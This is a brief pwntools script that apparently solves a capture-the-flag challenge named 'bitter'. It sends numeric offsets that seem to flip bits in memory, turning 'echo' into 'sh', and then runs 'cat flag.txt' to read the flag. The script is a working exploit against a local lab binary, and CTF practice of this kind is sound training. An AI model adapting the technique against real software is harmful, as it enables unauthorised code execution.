from pwn import *

r = process("./container/bitter")

# e -> s
r.sendline("769")
r.sendline("770")
r.sendline("772")

# c -> h
r.sendline(str(768 + 8))
r.sendline(str(768 + 9))
r.sendline(str(768 + 11))

# h -> \x00
r.sendline(str(768 + 8*2 + 3))
r.sendline(str(768 + 8*2 + 2 + 3))
r.sendline(str(768 + 8*2 + 3 + 3))

# bitter -> not bitter
r.sendline("128")

r.sendline("cat flag.txt")

print(r.recv())
